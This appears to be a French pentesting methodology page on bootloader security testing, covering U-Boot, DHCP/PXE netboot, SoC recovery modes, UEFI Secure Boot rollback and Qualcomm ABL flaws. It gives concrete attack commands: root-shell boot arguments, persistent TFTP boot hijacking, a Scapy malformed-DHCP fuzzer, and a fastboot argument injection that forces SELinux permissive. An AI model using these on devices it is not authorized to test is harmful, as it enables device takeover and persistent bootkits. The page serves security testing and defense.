# Tests du bootloader

{{#include ../../banners/hacktricks-training.md}}

Les étapes suivantes sont recommandées pour modifier les configurations de démarrage des appareils et tester les bootloaders tels que U-Boot et les chargeurs de classe UEFI. Concentrez-vous sur l’obtention d’une exécution de code précoce, l’évaluation des protections contre les signatures et le rollback, ainsi que l’exploitation des chemins de récupération ou de démarrage réseau.

Connexe : contournement du secure boot MediaTek via le patching de bl2_ext :

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Solutions rapides pour U-Boot et exploitation de l’environnement

1. Accéder au shell de l’interpréteur
   - Pendant le démarrage, appuyez sur une touche d’interruption connue (souvent n’importe quelle touche, 0, espace ou une séquence « magique » spécifique à la carte) avant l’exécution de `bootcmd` pour accéder à l’invite U-Boot.<sup>[[1]](#references)</sup>

2. Inspecter l’état et les variables de démarrage
   - Commandes utiles :
     - `printenv` (afficher l’environnement)
     - `bdinfo` (informations sur la carte, adresses mémoire)
     - `help bootm; help booti; help bootz` (méthodes de démarrage du noyau prises en charge)
     - `help ext4load; help fatload; help tftpboot` (chargeurs disponibles)

3. Modifier les arguments de démarrage pour obtenir un shell root
   - Ajoutez `init=/bin/sh` afin que le noyau ouvre un shell au lieu de lancer l’init habituel :
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Démarrage réseau depuis votre serveur TFTP
   - Configurer le réseau et récupérer une image noyau/FIT depuis le réseau local :
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persister les modifications via l’environnement
   - Si le stockage env n’est pas protégé en écriture, vous pouvez persister le contrôle :
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Vérifiez les variables comme `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` qui influencent les chemins de repli. Des valeurs mal configurées peuvent permettre d’accéder à plusieurs reprises au shell.

6. Vérifier les fonctionnalités de debug/non sécurisées
   - Recherchez : `bootdelay` > 0, `autoboot` désactivé, `usb start; fatload usb 0:1 ...` sans restriction, la possibilité d’utiliser `loady`/`loads` via le port série, `env import` depuis un support non fiable, et le chargement de kernels/ramdisks sans vérification de signature.

7. Tests des images/de la vérification U-Boot
   - Si la plateforme prétend prendre en charge le secure/verified boot avec des images FIT, essayez des images non signées et falsifiées :
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - L’absence de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou le comportement historique de `verify=n` permet souvent de démarrer des payloads arbitraires.
   - Ne vous arrêtez pas à un simple résultat d’autorisation ou de refus : des recherches récentes sur FIT ont montré que le chemin de vérification lui-même peut constituer une surface d’attaque pré-authentification. Testez négativement les données FIT stockées en externe (`data-offset`, `data-position`, `data-size`), la sélection de configuration signée, `loadables` et la gestion des overlays / `extra-conf`.
   - Si vous disposez d’un arbre source correspondant, `test/vboot/vboot_test.sh` permet de reproduire rapidement le comportement de vérification FIT dans le sandbox U-Boot avant de toucher au matériel réel.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` et les flux de démarrage par script
   - Dans les builds U-Boot modernes, `bootcmd` n’est souvent qu’un wrapper autour de Standard Boot. Les supports inscriptibles, PXE ou la mémoire flash SPI peuvent donc constituer la véritable frontière de confiance, même lorsque l’environnement visible semble inoffensif.
   - La bootmeth `extlinux` recherche `extlinux/extlinux.conf` sous `/` et `/boot` ; la bootmeth de script recherche d’abord `boot.scr.uimg`, puis `boot.scr`. Pour le démarrage réseau, le nom du script peut provenir de `boot_script_dhcp`.
   - Commandes de triage utiles :
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Cas d’abus à tester : support USB/SD contrôlé par un attaquant apparaissant plus tôt dans `boot_targets`, `/boot/extlinux/extlinux.conf` modifiable, serveur TFTP malveillant fournissant `boot.scr`, ou exécution de script via SPI avec `script_offset_f`.
   - Si la plateforme s’appuie sur la vérification FIT, assurez-vous que les configurations sont signées au niveau de la configuration, et pas seulement image par image ; `required-mode=all` est plus strict que l’acceptation d’une seule clé requise.

## Surface de démarrage réseau (DHCP/PXE) et serveurs malveillants

9. Fuzzing des paramètres PXE/DHCP
   - La gestion historique de BOOTP/DHCP par U-Boot a connu des problèmes de sécurité mémoire. Par exemple, CVE‑2024‑42040 décrit une divulgation de mémoire via des réponses DHCP forgées, pouvant leak des octets de la mémoire d’U-Boot sur le réseau.<sup>[[4]](#references)</sup> Testez les chemins de code DHCP/PXE avec des valeurs trop longues ou limites (nom de fichier de démarrage de l’option 67, options du fournisseur, champs file/servername) et surveillez les blocages/leaks.
   - Extrait Scapy minimal pour tester les paramètres de démarrage pendant le netboot :
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Vérifiez également si les champs de nom de fichier PXE sont transmis à la logique du shell/loader sans assainissement lorsqu’ils sont utilisés par des scripts de provisionnement côté OS.

10. Tests d’injection de commandes via un serveur DHCP malveillant
   - Configurez un service DHCP/PXE malveillant et essayez d’injecter des caractères dans les champs de nom de fichier ou d’options afin d’atteindre les interpréteurs de commandes aux étapes suivantes de la chaîne de démarrage. L’auxiliaire DHCP de Metasploit, `dnsmasq` ou des scripts Scapy personnalisés conviennent. Isolez d’abord le réseau de laboratoire.

## Modes de récupération ROM du SoC qui remplacent le démarrage normal

De nombreux SoC exposent un mode « loader » BootROM qui accepte du code via USB/UART, même lorsque les images flash sont invalides. Si les fusibles Secure Boot ne sont pas programmés, cela peut permettre l’exécution de code arbitraire très tôt dans la chaîne.

- NXP i.MX (Serial Download Mode)
  - Outils : `uuu` (mfgtools3) ou `imx-usb-loader`.
  - Exemple : `imx-usb-loader u-boot.imx` pour charger et exécuter un U-Boot personnalisé depuis la RAM.
- Allwinner (FEL)
  - Outil : `sunxi-fel`.
  - Exemple : `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Outil : `rkdeveloptool`.
  - Exemple : `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` pour charger un loader et téléverser un U-Boot personnalisé.

Vérifiez si les eFuses/OTP Secure Boot de l’appareil sont programmés. Sinon, les modes de téléchargement BootROM contournent souvent toute vérification de niveau supérieur (U-Boot, kernel, rootfs) en exécutant directement votre payload de première étape depuis la SRAM/DRAM.

## Chargeurs de démarrage UEFI/PC : vérifications rapides

11. Tests de falsification de l’ESP, de rollback et d’inscription de clés
   - Montez la partition système EFI (ESP) et recherchez les composants du loader : `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, chemins des logos du fabricant.
   - Lorsque c’est possible, récupérez l’état Secure Boot et les bases de données de clés depuis l’OS :
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Si la plateforme est en Setup Mode, accepte l’inscription de clés sans authentification ou est livrée avec une Platform Key de test/par défaut (classe PKfail), un administrateur local ou un attaquant ayant un accès physique peut inscrire sa propre KEK/db et faire en sorte que Secure Boot semble « activé » tout en démarrant des binaires EFI arbitraires.<sup>[[3]](#references)</sup>
   - Essayez de démarrer avec des composants de démarrage signés vulnérables connus ou dont la version a été rétrogradée si les révocations Secure Boot (dbx) ne sont pas à jour. Si la plateforme fait toujours confiance à d’anciens shims/bootmanagers, vous pouvez souvent charger votre propre kernel ou `grub.cfg` depuis l’ESP pour obtenir de la persistance.
   - Sous Windows, des hôtes corrigés peuvent toujours accepter des boot managers signés vulnérables si le signataire `Microsoft Windows Production PCA 2011` est absent de la `dbx` du firmware, comme observé avec BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Un bypass de type Baton Drop peut inscrire un MOK d’attaquant ; un shim légitime peut alors charger, lors des démarrages suivants, un payload EFI signé par cette clé.<sup>[[12]](#references)[[13]](#references)</sup> La révocation ultérieure de l’ancien signataire Windows ne supprime pas le MOK inscrit ; la méthode basée sur le shim peut donc persister si ce shim reste approuvé.<sup>[[12]](#references)</sup>
   - Avant de tester cette méthode de rollback sur une machine UEFI autorisée, vérifiez l’**état effectif des révocations du firmware**, et pas seulement l’historique des mises à jour Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft fournit cette commande PowerShell en lecture seule, à exécuter avec des privilèges élevés, pour vérifier le signataire 2011 dans la `dbx` :<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` n'est qu'une piste : confirmez le composant de démarrage signé concerné et les autres révocations dans un laboratoire récupérable.<sup>[[12]](#references)[[14]](#references)</sup> Une mise à jour du registre en attente ou un certificat de signature expiré n'équivalent pas à une révocation `dbx` effectuée.<sup>[[13]](#references)[[14]](#references)</sup>

12. Tests de révocation de shim obsolètes / SBAT / dbx
   - Les anciens shims signés par Microsoft et les forks de fournisseurs peuvent encore servir de voie de bootkit de type BYOVD si les révocations sont obsolètes. Dans un laboratoire isolé, placez un shim historiquement vulnérable sur l'ESP et tentez de chainload votre propre `grubx64.efi` ou noyau.<sup>[[11]](#references)</sup>
   - Triage rapide :
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Si le shim s’exécute toujours alors qu’il figure sur la liste de révocation, le firmware/OS dispose de mises à jour `dbx` obsolètes ou fait confiance à un fork du loader qui n’a jamais hérité des protections SBAT upstream.

13. Bugs d’analyse des logos de démarrage (classe LogoFAIL)
   - Plusieurs firmwares OEM/IBV étaient vulnérables à des failles d’analyse d’images dans DXE, lors du traitement des logos de démarrage. Si un attaquant peut placer une image conçue à cet effet sur l’ESP, sous un chemin propre au fabricant (par exemple, `\EFI\<vendor>\logo\*.bmp`), puis redémarrer, une exécution de code au début du démarrage peut être possible même avec Secure Boot activé. Vérifiez si la plateforme accepte les logos fournis par l’utilisateur et si ces chemins sont accessibles en écriture depuis l’OS.<sup>[[2]](#references)</sup>


## Lacunes de confiance ABL + GBL de Qualcomm sur Android 16

Sur les appareils Android 16 qui utilisent l’ABL de Qualcomm pour charger la **Generic Bootloader Library (GBL)**, vérifiez si l’ABL **authentifie** l’application UEFI qu’il charge depuis la partition `efisp`. Si l’ABL vérifie uniquement la **présence** d’une application UEFI sans vérifier les signatures, une primitive d’écriture sur `efisp` permet une **exécution de code non signé avant le démarrage de l’OS**.<sup>[[6]](#references)[[7]](#references)</sup>

Vérifications pratiques et vecteurs d’exploitation :

- **Primitive d’écriture sur efisp** : Il faut pouvoir écrire une application UEFI personnalisée dans `efisp` (service root/privilégié, bug dans une application OEM, chemin recovery/fastboot). Sans cela, la faille de chargement de GBL n’est pas directement exploitable.<sup>[[6]](#references)</sup>
- **Injection d’arguments OEM fastboot** (bug ABL) : Certains builds acceptent des jetons supplémentaires dans `fastboot oem set-gpu-preemption` et les ajoutent à la ligne de commande du kernel. Cela peut servir à forcer SELinux en mode permissif et permettre l’écriture dans des partitions protégées :
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Si l’appareil est corrigé, la commande doit rejeter les arguments supplémentaires.<sup>[[5]](#references)[[6]](#references)</sup>
- **Déverrouillage du bootloader via des flags persistants** : Un payload exécuté à l’étape de démarrage peut modifier les flags persistants de déverrouillage (par ex. `is_unlocked=1`, `is_unlocked_critical=1`) afin d’émuler `fastboot oem unlock` sans passer par les contrôles du serveur ou d’approbation OEM. Ce changement de posture est durable après le redémarrage suivant.<sup>[[6]](#references)</sup>

Notes défensives/de triage :

- Vérifiez si ABL effectue une vérification de signature du payload GBL/UEFI provenant de `efisp`. Si ce n’est pas le cas, considérez `efisp` comme une surface de persistance à haut risque.
- Vérifiez si les handlers fastboot OEM d’ABL sont patchés pour **valider le nombre d’arguments** et rejeter les tokens supplémentaires.<sup>[[8]](#references)[[9]](#references)</sup>

## Précautions matérielles

Soyez prudent lorsque vous manipulez la mémoire flash SPI/NAND pendant le démarrage initial (par ex., en mettant des broches à la masse pour contourner les lectures) et consultez toujours la fiche technique de la mémoire flash. Des courts-circuits mal synchronisés peuvent endommager l’appareil ou le programmateur.

## Notes et conseils supplémentaires

- Essayez `env export -t ${loadaddr}` et `env import -t ${loadaddr}` pour déplacer des blobs d’environnement entre la RAM et le stockage ; certaines plateformes permettent d’importer un env depuis un support amovible sans authentification.
- Pour assurer la persistance sur les systèmes basés sur Linux qui démarrent via `extlinux.conf`, modifier la ligne `APPEND` (pour injecter `init=/bin/sh` ou `rd.break`) sur la partition de démarrage suffit souvent lorsque les signatures ne sont pas vérifiées.
- Si la cible utilise des mises à jour à double slot / A/B, examinez les techniques anti-rollback et de désynchronisation des slots dans la [vue d’ensemble de l’analyse de firmware](README.md) afin de ne pas passer à côté de failles de confiance propres au programme de mise à jour, en dehors du bootloader lui-même.
- Si l’espace utilisateur fournit `fw_printenv/fw_setenv`, vérifiez que `/etc/fw_env.config` correspond au stockage réel de l’env. Des offsets mal configurés permettent de lire/écrire dans la mauvaise région MTD.

## References

- [1] [Méthodologie de test de sécurité du firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Découverte de LogoFAIL : les dangers de l’analyse d’images au démarrage du système](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail : des clés de plateforme non fiables compromettent Secure Boot dans l’écosystème UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Détails de CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Préempté : déverrouiller un Xiaomi à l’aide de deux chaînes non assainies](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [L’exploit GBL du Qualcomm Snapdragon 8 Elite permet aux attaquants de déverrouiller les bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architecture du Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg : corriger la propagation d’une entrée non fiable dans la ligne de commande du noyau](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg : ajouter une vérification pour la commande set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Inapte au démarrage : contourner la vérification de signature FIT d’U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Note de vulnérabilité VU#616257 - Les bootloaders shim UEFI signés par Microsoft sont vulnérables à un contournement de Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus : le mythe confirmé](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX : un bootkit UEFI similaire à BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Comment gérer les révocations de Windows Boot Manager pour les changements de Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
